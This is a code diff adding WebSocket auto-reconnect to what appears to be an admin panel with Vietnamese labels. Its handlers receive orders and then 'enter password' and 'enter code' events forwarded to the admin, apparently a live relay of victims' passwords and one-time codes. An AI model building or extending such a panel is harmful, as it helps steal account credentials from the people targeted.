@@ -488,7 +488,76 @@ $domain_socket = file_get_contents('../domain_name.txt');
     </div>
 
     <script>
-        const ws = new WebSocket('wss://<?php echo $domain_socket; ?>');
+        let ws = null;
+        let reconnectInterval = 3000; // 5 seconds
+        let reconnectTimer = null;
+
+        function createWebSocket() {
+            ws = new WebSocket('wss://<?php echo $domain_socket; ?>');
+            
+            ws.onopen = function() {
+                console.log('Admin connected to WebSocket.');
+                clearTimeout(reconnectTimer);
+                
+                ws.send(JSON.stringify({
+                    type: 'get_all_orders'
+                }));
+            };
+
+            ws.onclose = function() {
+                console.log('WebSocket connection closed. Reconnecting...');
+                reconnectTimer = setTimeout(createWebSocket, reconnectInterval);
+                console.log('WebSocket connection closed. Reconnecting...2');
+            };
+
+            ws.onerror = function(error) {
+                console.error('WebSocket error:', error);
+                ws.close();
+            };
+
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+
+                if (data.type === 'new_order') {
+                    step1(data);
+                }
+                
+                if (data.type === 'admin_approve') {
+                    const btn_approve = document.getElementById(`approve-btn-${data.order_id}`);
+                    btn_approve.innerHTML = '<i class="fas fa-check"></i> Đợi PW';
+                }
+
+                if (data.type === 'enter_password_to_admin') {
+                    step2(data);
+                }
+
+                if (data.type === 'enter_code_to_admin') {
+                    step3(data);
+                }
+
+                if (data.type === 'remove_order') {
+                    const orderId = data.order_id;
+                    const order = orders[orderId];
+                    if (order) {
+                        delete orders[orderId];
+                    }
+                    renderOrders();
+                }
+
+                if (data.type === 'remove_all_orders') {
+                    orders = {};
+                    renderOrders();
+                }
+
+                if (data.type === 'all_orders') {
+                    orders = data.orders;
+                    renderOrders();
+                }
+            };
+        }
+
+        createWebSocket();
+
         const ordersTable = document.getElementById('orders');
         const notificationBell = document.getElementById('notificationBell');
         const notificationSound = document.getElementById('notificationSound');
@@ -524,7 +593,6 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 notificationSound.currentTime = 0;
                 notificationSound.play().catch(error => {
                     console.log('Error playing sound:', error);
-                    // Nếu lỗi, tự động tắt thông báo
                     notificationEnabled = false;
                     notificationToggleBtn.innerHTML = '<i class="fas fa-bell"></i> Bật thông báo';
                     notificationToggleBtn.classList.remove('disabled');
@@ -536,54 +604,6 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 notificationBell.classList.remove('has-notification');
             }, 2000);
         }
-
-        ws.onopen = function() {
-            console.log('Admin connected to WebSocket.');
-            
-            ws.send(JSON.stringify({
-                type: 'get_all_orders'
-            }));
-        };
-
-        ws.onmessage = function(event) {
-            const data = JSON.parse(event.data);
-
-            if (data.type === 'new_order') {
-                step1(data);
-            }
-            
-            if (data.type === 'admin_approve') {
-                const btn_approve = document.getElementById(`approve-btn-${data.order_id}`);
-                btn_approve.innerHTML = '<i class="fas fa-check"></i> Đợi PW';
-            }
-
-            if (data.type === 'enter_password_to_admin') {
-                step2(data);
-            }
-
-            if (data.type === 'enter_code_to_admin') {
-                step3(data);
-            }
-
-            if (data.type === 'remove_order') {
-                const orderId = data.order_id;
-                const order = orders[orderId];
-                if (order) {
-                    delete orders[orderId];
-                }
-                renderOrders();
-            }
-
-            if (data.type === 'remove_all_orders') {
-                orders = {};
-                renderOrders();
-            }
-
-            if (data.type === 'all_orders') {
-                orders = data.orders;
-                renderOrders();
-            }
-        };
 
         function addCopyButton(td) {
             // Bỏ qua thẻ td đầu tiên (cột xóa)
